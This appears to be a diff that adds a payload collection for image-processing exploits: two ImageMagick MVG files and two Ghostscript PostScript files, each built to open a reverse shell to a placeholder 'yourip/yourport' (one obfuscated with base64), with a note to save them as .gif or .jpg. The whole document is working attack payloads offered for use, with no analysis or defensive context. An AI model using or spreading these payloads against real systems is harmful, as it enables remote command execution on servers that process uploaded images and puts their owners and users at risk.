@@ -1,0 +1,36 @@
+1.
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwL3lvdXJpcC95b3VycG9ydCAwPiYx | base64 -d | bash`"||id " )'
+pop graphic-context
+
+2.
+push graphic-context
+encoding "UTF-8"
+viewbox 0 0 1 1
+affine 1 0 0 1 0 0
+push graphic-context
+image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/yourip/yourport 0<&1 2>&1'
+pop graphic-context
+pop graphic-context
+
+3.
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%ncat yourip yourport -e /bin/sh) currentdevice putdeviceprops
+
+4.
+%!PS
+userdict /setpagedevice undef
+legal
+{ null restore } stopped { pop } if
+legal
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
+
+Note:
+Save as test.gif or test.jpg
